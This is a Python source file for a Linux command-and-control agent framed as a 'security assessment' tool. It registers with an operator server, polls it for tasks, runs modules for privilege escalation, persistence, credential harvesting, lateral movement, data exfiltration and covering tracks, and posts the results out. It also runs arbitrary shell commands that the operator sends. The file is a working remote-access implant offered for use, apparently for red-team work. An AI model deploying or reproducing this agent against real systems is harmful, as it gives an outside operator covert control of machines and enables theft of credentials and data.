#!/usr/bin/env python3
"""
C2 Agent - Linux
Security Assessment Agent for Linux Systems
"""

import requests
import time
import socket
import platform
import json
import sys
import os
from datetime import datetime
from collections import defaultdict

# Configuration
OPERATOR_URL = "{{OPERATOR_URL}}"
AGENT_ID = "{{AGENT_ID}}"
CHECKIN_INTERVAL = 30  # seconds
STORE_RESULTS_LOCALLY = True  # Store results on agent
LOCAL_RESULTS_DIR = "assessment_results"  # Directory for local results

# Import security modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'modules'))

try:
    from modules import privilege_escalation
    from modules import persistence
    from modules import credential_harvesting
    from modules import reconnaissance
    from modules import lateral_movement
    from modules import data_access
    from modules import data_exfiltration
    from modules import c2_comms
    from modules import covering_tracks
except ImportError as e:
    print(f"[!] Failed to import modules: {e}")
    sys.exit(1)

# Module registry - matches operator/module_registry.py
MODULE_REGISTRY = {
    "privilege_escalation": {"module": privilege_escalation, "priority": 1},
    "persistence": {"module": persistence, "priority": 2},
    "credential_harvesting": {"module": credential_harvesting, "priority": 3},
    "reconnaissance": {"module": reconnaissance, "priority": 1},
    "lateral_movement": {"module": lateral_movement, "priority": 4},
    "data_access": {"module": data_access, "priority": 3},
    "data_exfiltration": {"module": data_exfiltration, "priority": 4},
    "c2_comms": {"module": c2_comms, "priority": 2},
    "covering_tracks": {"module": covering_tracks, "priority": 5}
}

class C2Agent:
    def __init__(self):
        self.agent_id = AGENT_ID
        self.operator_url = OPERATOR_URL
        self.hostname = socket.gethostname()
        self.platform = f"{platform.system()} {platform.release()}"
        self.results_storage = []  # In-memory storage for all results
        self.module_execution_count = 0

        # Create local results directory if needed
        if STORE_RESULTS_LOCALLY:
            os.makedirs(LOCAL_RESULTS_DIR, exist_ok=True)

    def register(self):
        """Register with operator"""
        try:
            response = requests.post(
                f"{self.operator_url}/api/register",
                json={
                    "agent_id": self.agent_id,
                    "hostname": self.hostname,
                    "platform": self.platform
                },
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Registration failed: {e}")
            return False

    def checkin(self):
        """Check in with operator and get commands"""
        try:
            response = requests.post(
                f"{self.operator_url}/api/checkin",
                json={"agent_id": self.agent_id},
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return data.get('command')
        except Exception as e:
            print(f"[!] Check-in failed: {e}")
        return None

    def send_results(self, module, results):
        """Send assessment results to operator and store locally"""
        result_entry = {
            "timestamp": datetime.now().isoformat(),
            "module": module,
            "results": results
        }

        # Store in memory
        self.results_storage.append(result_entry)

        # Store to disk if enabled
        if STORE_RESULTS_LOCALLY:
            self.save_result_to_disk(module, result_entry)

        # Send to operator
        try:
            response = requests.post(
                f"{self.operator_url}/api/results",
                json={
                    "agent_id": self.agent_id,
                    "module": module,
                    "results": results
                },
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Failed to send results: {e}")
            return False

    def save_result_to_disk(self, module, result_entry):
        """Save individual result to disk"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{module}_{timestamp}.json"
            filepath = os.path.join(LOCAL_RESULTS_DIR, filename)

            with open(filepath, 'w') as f:
                json.dump(result_entry, f, indent=2)

            print(f"[+] Result saved: {filepath}")
        except Exception as e:
            print(f"[!] Failed to save result to disk: {e}")

    def generate_local_report(self):
        """Generate comprehensive local report from all stored results"""
        print("[*] Generating local report...")

        report = {
            "agent_info": {
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "platform": self.platform,
                "report_generated": datetime.now().isoformat()
            },
            "summary": {
                "total_modules_executed": self.module_execution_count,
                "total_results": len(self.results_storage),
                "modules_run": list(set([r["module"] for r in self.results_storage]))
            },
            "results": self.results_storage
        }

        # Calculate findings summary
        findings_by_severity = defaultdict(int)
        for result in self.results_storage:
            findings = result.get("results", {}).get("findings", [])
            for finding in findings:
                severity = finding.get("severity", "unknown")
                findings_by_severity[severity] += 1

        report["summary"]["findings_by_severity"] = dict(findings_by_severity)

        # Save comprehensive report
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"comprehensive_report_{timestamp}.json"
            filepath = os.path.join(LOCAL_RESULTS_DIR, filename)

            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2)

            print(f"[+] Comprehensive report saved: {filepath}")
            print(f"[*] Total findings by severity: {dict(findings_by_severity)}")

            return report
        except Exception as e:
            print(f"[!] Failed to generate report: {e}")
            return None

    def execute_module(self, module_name):
        """Execute a security assessment module"""
        print(f"[*] Executing module: {module_name}")

        try:
            # Check if module exists in registry
            if module_name in MODULE_REGISTRY:
                module = MODULE_REGISTRY[module_name]["module"]
                results = module.check()
                self.module_execution_count += 1
                self.send_results(module_name, results)
            else:
                results = {"error": f"Unknown module: {module_name}"}
                self.send_results(module_name, results)

        except Exception as e:
            error_results = {"error": str(e)}
            self.send_results(module_name, error_results)

    def execute_all_modules(self):
        """Execute all available modules by priority"""
        print("[*] Executing ALL security assessment modules...")

        # Sort modules by priority
        sorted_modules = sorted(
            MODULE_REGISTRY.items(),
            key=lambda x: x[1]["priority"]
        )

        total = len(sorted_modules)
        print(f"[*] Total modules to execute: {total}\n")

        for i, (module_name, module_info) in enumerate(sorted_modules, 1):
            print(f"[*] [{i}/{total}] Executing: {module_name}")
            try:
                module = module_info["module"]
                results = module.check()
                self.module_execution_count += 1
                self.send_results(module_name, results)
                print(f"[+] [{i}/{total}] Completed: {module_name}")
            except Exception as e:
                print(f"[!] [{i}/{total}] Failed: {module_name} - {e}")
                error_results = {"error": str(e)}
                self.send_results(module_name, error_results)

        print(f"\n[+] All modules executed ({self.module_execution_count} total)")

        # Generate comprehensive report
        if STORE_RESULTS_LOCALLY:
            print("[*] Generating comprehensive local report...")
            self.generate_local_report()

    def run(self):
        """Main agent loop"""
        print(f"[*] Agent starting - ID: {self.agent_id}")
        print(f"[*] Operator: {self.operator_url}")

        # Register with operator
        if not self.register():
            print("[!] Failed to register with operator")
            return

        print("[+] Successfully registered with operator")

        # Main loop
        while True:
            try:
                command = self.checkin()

                if command:
                    cmd_type = command.get('type')

                    if cmd_type == 'module':
                        module_name = command.get('module')

                        # Check if "all" modules requested
                        if module_name and module_name.lower() == 'all':
                            self.execute_all_modules()
                        else:
                            self.execute_module(module_name)

                    elif cmd_type == 'report':
                        # Generate and send comprehensive report
                        print("[*] Report generation requested...")
                        report = self.generate_local_report()
                        if report:
                            self.send_results('comprehensive_report', report)
                            print("[+] Report sent to operator")

                    elif cmd_type == 'shell':
                        # Execute shell command (basic implementation)
                        import subprocess
                        cmd = command.get('cmd')
                        try:
                            output = subprocess.check_output(
                                cmd,
                                shell=True,
                                stderr=subprocess.STDOUT,
                                timeout=30
                            ).decode('utf-8', errors='ignore')
                            self.send_results('shell', {'output': output})
                        except Exception as e:
                            self.send_results('shell', {'error': str(e)})

                time.sleep(CHECKIN_INTERVAL)

            except KeyboardInterrupt:
                print("\n[*] Agent shutting down")

                # Generate final report before exit
                if STORE_RESULTS_LOCALLY and self.results_storage:
                    print("[*] Generating final report...")
                    self.generate_local_report()

                break
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
                time.sleep(CHECKIN_INTERVAL)

if __name__ == '__main__':
    agent = C2Agent()
    agent.run()
